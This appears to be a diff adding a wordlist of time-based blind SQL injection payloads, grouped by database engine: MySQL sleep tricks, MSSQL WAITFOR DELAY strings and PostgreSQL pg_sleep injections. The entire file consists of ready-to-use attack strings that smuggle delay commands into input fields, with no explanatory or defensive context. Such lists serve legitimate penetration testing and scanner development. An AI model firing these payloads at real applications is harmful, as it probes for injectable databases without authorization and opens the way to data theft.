@@ -1,0 +1,18 @@
+-------MYSQL----
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+if(now()=sysdate(),sleep(3),0)
+(select(0)from(select(sleep(3)))v)/'+(select(3)from(select(sleep(3)))v)+'"+(select(0)from(select(sleep(3)))v)+"/
+'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='
+1'XOR(if(now()=sysdate(),sleep(5),0))OR'
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 or sleep(5)#
+
+---MSSQL-----
+'%20WAITFOR%20DELAY%20'0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+
+-----POSTGRESQL----
+%';SELECT PG_SLEEP(5)--
+pg_sleep(10)
+'| |pg_sleep(10)--
